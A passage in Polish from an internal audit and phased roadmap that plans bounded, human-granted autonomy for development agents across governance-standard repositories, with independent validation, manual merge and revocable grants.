| Repozytoria z kontraktem o nieistniejącym identyfikatorze | **1** (`auth-lifecycle`) |

Dwie pułapki pomiarowe, w które łatwo wpaść:

1. **Walidator huba wycelowany w cudze repo daje fałszywy alarm.**
   `new-project/scripts/governance_check.py` w wersji 0.18.1 zwraca `GOV-FAIL`
   dla wszystkich 24 adoptowanych repozytoriów, na polu
   `approvalEvidence.signedAttestationPredicateType`. To nie jest defekt tych
   repozytoriów — są przypięte do wcześniejszej rewizji standardu i **wewnętrznie
   spójne**: ich pinowany `manifest.schema.json` i ich `manifest.json` niosą tę
   samą wartość. Uruchomione własną bramką (`project/governance-check.sh`)
   przechodzą.

2. **Ręczna „naprawa" zepsułaby je.** Migracja hosta `wellmanifest.dev` →
   `wellmanifest.com` jest już rozpoznana i zamknięta w hubie jako
   `new-project/project/ticket-082` (DONE, wydane w v0.18.1). Ten ticket
   stwierdza wprost, że repozytoria adoptujące przejmą zmianę **przez ponowną
   adopcję generatorem, a nie przez ręczną edycję plików zarządzanych**, i że
   jakakolwiek edycja wewnątrz repozytoriów adoptujących jest poza zakresem.
   Podmiana samego `manifest.json` na `.com` unieważniłaby go wobec pinowanego
   `manifest.schema.json`, który trzyma `.dev` jako `const` i jest plikiem
   zarządzanym (jednym z 34 w `manifest.lock.json`). Zamieniłoby to 17 zielonych
   repozytoriów na czerwone.

**Jedyny realny wyjątek: `auth-lifecycle`.** `.governance/` zawiera wyłącznie
pusty katalog `error/` — brak manifestu, brak `project.sh`. Trzy jego intenty
deklarują `wellmanifest.new-project/intent/v1`, identyfikator, który **nigdy nie
istniał** w hubie (historycznie było `new-project.intent/v1`). To ta sama klasa
defektu co E-0, w jedynym innym miejscu w ekosystemie.

**Wniosek dla planu:** wzorzec „deklaracja bez wiązania" nie jest chorobą
wellmanifest — jest chorobą repozytoriów, które go nie zaadoptowały. Blokadą
dla wszystkich pozostaje jedno: `goal governance adopt` wymaga Goal ≥ 2.1.295,
a zainstalowany jest 2.1.284 i nie ma podkomendy `governance`.

#### Faza 1 — Konsumpcja kontraktów zamiast własnych (`evidence`)

Zakres: E-1, E-2.

1. **Dowody i receipty** — zamiast rozwijać własny `EvidenceRecord`, odwzorować go
   na kontrakt `subactor/twin` (observations / evidence / receipts z protobuf).
   `EvidenceRecord` zostaje wewnętrzną reprezentacją; artefakt na wyjściu jest w kontrakcie.
2. **Adaptery rzeczywistości** — **skreślić** P0 z `docs/NEXT_STEPS.md`
   (Git / AST / TestQL / runtime / ticket) i zastąpić konsumpcją `subactor/twin-probes`.
   Te adaptery już istnieją i mają wspólny format; pisanie ich drugi raz to E-1.
3. **Intencja z kodu** — wpiąć `t2c extract runtime` jako drugie źródło zdarzeń
   obok historii promptów. Historia mówi, *jak* człowiek chce pracować; `t2c` mówi,
   *co* jest w kodzie. Ranking `projectReality` w `source-policy.json` już przewiduje
   te klasy źródeł — brakuje wyłącznie adapterów wejściowych.
4. **Konformans** — `make validate` uruchamia walidatory zaadoptowanych standardów.

**Warunek wyjścia:** `developer-twin.dsl.json` cytuje co najmniej jeden dowód
pochodzący z `twin-probes` i jeden z `t2c`, z przypiętą rewizją, a konformans
sześciu zadeklarowanych standardów jest zielony w `make validate`.

---

#### Faza 2 — Wiązanie w profilu autonomii (`plan`, propose-only)

Zakres: E-3.

1. Dodać `twin-developer` do `ownership.runtimeOwners` w
   `wellmanifest/autonomy/profiles/subactor-semcod.profile.json`.
2. Dodać wiązania: `evidence → twin-developer (observer, read-only)`
   oraz `plan → twin-developer (planner, propose-only)`.
3. Wyprowadzić blok `autonomy` z literału TypeScript (`src/twin/aggregate.ts:181-186`)
   do manifestu zgodnego z `wellmanifest/autonomy`, walidowanego
   przez `src/autonomy_check.py`. Polityka przestaje być kodem, staje się danymi.
4. Promocję reguł `candidate → active` związać z grafem etapów
   z `wellmanifest/twin-lifecycle`, a nie z ad-hoc decyzją — zgodnie z P0
   „governance and promotion" z `NEXT_STEPS.md`, które tu zostaje w mocy.

**Warunek wyjścia:** `autonomy_check.py` przechodzi na profilu zawierającym
`twin-developer`; DSL wyprodukowany przez runtime jest odczytany przez etap `plan`
w co najmniej jednym przebiegu i widoczny w `guidelines.json` jako źródło ograniczeń.

**Czego nie wolno w tej fazie:** żadnego wiązania z `implement` ani `publish`,
żadnego zapisu poza `data/output/`.

---

#### Faza 3 — Pętla z niezależnym walidatorem, bez merge

Zakres: uruchomienie łańcucha end-to-end na jednym, wybranym repozytorium.

1. **Poligon:** `subactor/autonomy-lab`. Zgodnie z jego konstrukcją harness
   uruchamia się z własnego CLI i jest piaskownicą — nie rejestruje się go
   jako konektor. To właściwe miejsce na pierwszy pełny cykl.
2. **Cykl:** `dispatch (autonom) → observe (twin-probes) → evidence (twin-developer + t2c)
   → plan (twin-developer + orchestrator) → implement (repair-agent) →
   validate (validator-agent) → PR`. **Merge zostaje ręczny.**
3. **Rozdział ról egzekwowany:** agent, który zaimplementował, nie może być
   tym, który waliduje. To wymóg standardu, nie preferencja.
4. **Bramka lokalna:** organizacja jest na planie free — nie ma branch protection,
   a runnery potrafią stać godzinami. Bramką musi być lokalny przebieg
   (`make validate` + `make test` + konformans), nie zielony status w GitHubie.
   Do uruchomienia workflow lokalnie służy orkiestrator `act` w `subactor/github-com`.
5. **Egzekucja `forbiddenEffects`** (A-7) jako pre-push w tym cyklu.

**Warunek wyjścia:** dziesięć kolejnych cykli, w których:
każdy PR ma receipty z exit code i rewizją; żaden `DONE` nie powstał bez receiptu;
co najmniej jeden cykl zakończył się **fail-closed** z eskalacją (jeśli żaden nie padł,
bramki są za słabe, nie praca za dobra).

---

#### Faza 4 — Standing grant, ograniczony

Dopiero teraz „zamiast foundera / developera / admina" staje się realne — i tylko
w granicach grantu.

1. **Grant** wystawia człowiek: konkretne repozytoria, konkretne klasy zadań
   (dług techniczny, testy, dokumentacja, aktualizacje zależności), budżet kosztu
   i liczby cykli, data wygaśnięcia. Grant nie odnawia sam siebie.
2. **Merge automatyczny** wyłącznie po zatwierdzeniu przez `validator-agent`,
   w trybie `protected-publish` przez `autonom`.
3. **Rozszerzanie zakresu** tylko przez nowy grant, po przeglądzie ledgera.
4. **Wycofanie:** jedna komenda unieważniająca grant, testowana jak backup —
   czyli faktycznie uruchamiana, nie zakładana.

**Wyraźne ograniczenie:** klasy zadań o dużej niepewności produktowej
(co budować, dla kogo, za ile) nie wchodzą do grantu i nie wejdą.
Autonomia dotyczy realizacji, nie kierunku.

---

### 3.4 Kolejność i zależności

```
Faza 0 (naprawy P0) ──┐
                      ├──► Faza 1 (kontrakty) ──► Faza 2 (wiązanie) ──► Faza 3 (pętla) ──► Faza 4 (grant)
E-2 (konformans) ─────┘
```

Faza 0 i konformans mogą iść równolegle. Fazy 1–4 są sekwencyjne — każda opiera
się na dowodzie wytworzonym przez poprzednią.

---

## 4. Ryzyka planu

1. **Zaufanie do niezmierzonej ekstrakcji.** Dopóki B-2 nie jest rozwiązane,
   reguły sterujące planem mają jakość nieznaną. Ryzyko rośnie liniowo z zakresem
   grantu. Mitygacja: benchmark z P2 przed Fazą 4, nie po.
2. **Podwójne źródło polityki.** Jeśli Faza 1 się rozjedzie, w organizacji będą
   dwa konkurencyjne modele dowodu (`subactor/twin` i ten). Mitygacja: Faza 2
   nie startuje bez domkniętej Fazy 1.
3. **Brak bramki CI w organizacji.** Plan free, brak branch protection —
   cała egzekucja jest lokalna i zależy od dyscypliny. Mitygacja: bramka
   jako pre-push hook w repo, nie jako konwencja.
4. **Sprzężenie z prywatnymi zależnościami.** Repozytoria `*-agent` zależą
   od prywatnego `skills-agent`; awarie tam zatrzymają Fazę 3 z przyczyn
   niezwiązanych z tym projektem. Mitygacja: Faza 3 na `autonomy-lab`,
   który jest piaskownicą.
5. **Grant jako pole do nadużycia.** Standard wymaga, aby grant nie mógł
   rozszerzyć samego siebie; implementacja musi to egzekwować, nie deklarować.
   To ten sam wzorzec, który w tym audycie zawiódł trzy razy (A-7, E-2, E-3):
   kontrakt bez wiązania.

---

## 5. Powiązane dokumenty

- `docs/NEXT_STEPS.md` — pozostaje w mocy poza P0 „reality adapters",
  które Faza 1 zastępuje konsumpcją `subactor/twin-probes`.
- `docs/SECURITY.md` — wymaga aktualizacji o A-3, A-4, A-5 (kontrole opisane
  jako istniejące, których nie ma w warstwie egzekwującej).
- `docs/SOURCE_TRUTH.md` — spójny z ustaleniami; nie wymaga zmian.
- `project/ticket-001/intent.json` — `forbiddenEffects` wymaga egzekucji (A-7).
